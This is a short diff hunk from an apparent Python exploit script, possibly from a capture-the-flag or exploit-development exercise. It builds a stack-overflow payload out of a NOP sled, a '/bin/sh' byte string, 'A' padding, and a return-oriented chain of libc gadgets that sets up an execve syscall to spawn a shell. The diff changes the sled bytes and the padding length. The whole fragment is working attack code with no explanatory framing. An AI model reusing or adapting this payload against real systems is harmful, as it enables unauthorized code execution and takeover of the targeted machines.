@@ -27,9 +27,9 @@ g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
 shellcode =''
 for i in range(1,35) :
-    shellcode += struct.pack('<x')
+    shellcode += '\x90'
 shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
-shellcode += 'A'*(994)
+shellcode += 'A'*(1048)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
